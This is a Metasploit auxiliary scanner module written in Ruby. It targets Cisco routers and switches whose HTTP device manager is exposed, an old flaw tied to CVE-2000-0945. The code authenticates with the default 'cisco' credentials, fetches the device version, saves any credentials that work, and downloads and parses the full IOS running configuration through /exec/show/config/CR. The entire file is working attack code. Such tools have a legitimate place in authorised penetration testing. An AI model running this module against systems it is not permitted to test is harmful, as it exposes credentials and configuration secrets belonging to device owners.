##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##



class MetasploitModule < Msf::Auxiliary

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::HttpClient

  # Include Cisco utility methods
  include Msf::Auxiliary::Cisco

  # Scanner mixin should be near last
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Cisco Device HTTP Device Manager Access',
      'Description'    => %q{
          This module gathers data from a Cisco device (router or switch) with the device manager
        web interface exposed. The HttpUsername and HttpPassword options can be used to specify
        authentication.
      },
      'Author'		=> [ 'hdm' ],
      'License'		=> MSF_LICENSE,
      'References'	=>
        [
          [ 'BID', '1846'],
          [ 'CVE', '2000-0945'],
          [ 'OSVDB', '444'],
        ],
      'DisclosureDate' => '2000-10-26'))
    register_options(
      [
        OptString.new('HttpUsername', [true, 'The HTTP username to specify for basic authentication', 'cisco']),
        OptString.new('HttpPassword', [true, 'The HTTP password to specify for basic authentication', 'cisco'])
      ])
  end

  def run_host(ip)

    res = send_request_cgi({
      'uri'  		=>  "/exec/show/version/CR",
      'method'   	=> 'GET'
    }, 20)

    if res and res.code == 401
      print_error("#{rhost}:#{rport} Failed to authenticate to this device")
      return
    end

    if res and res.code != 200
      print_error("#{rhost}:#{rport} Unexpected response code from this device #{res.code}")
      return
    end

    if res and res.body and res.body =~ /Cisco (Internetwork Operating System|IOS) Software/
      print_good("#{rhost}:#{rport} Successfully authenticated to this device")
      store_valid_credential(user: datastore['HttpUsername'], private: datastore['HttpPassword'])

      # Report a vulnerability only if no password was specified
      if datastore['HttpPassword'].to_s.length == 0

        report_vuln(
          {
            :host	=> rhost,
            :port	=> rport,
            :proto  => 'tcp',
            :name	=> self.name,
            :info	=> "Module #{self.fullname} successfully accessed http://#{rhost}:#{rport}/exec/show/version/CR",
            :refs   => self.references,
            :exploited_at => Time.now.utc
          }
        )

      end

      res = send_request_cgi({
        'uri'  		=>  "/exec/show/config/CR",
        'method'   	=> 'GET'
      }, 20)

      if res and res.body and res.body =~ /<FORM METHOD([^\>]+)\>(.*)/mi
        config = $2.gsub(/<\/[A-Z].*/i, '').strip
        print_good("#{rhost}:#{rport} Processing the configuration file...")
        cisco_ios_config_eater(rhost, rport, config)
      else
        print_error("#{rhost}:#{rport} Error: could not retrieve the IOS configuration")
      end

    end

  end
end
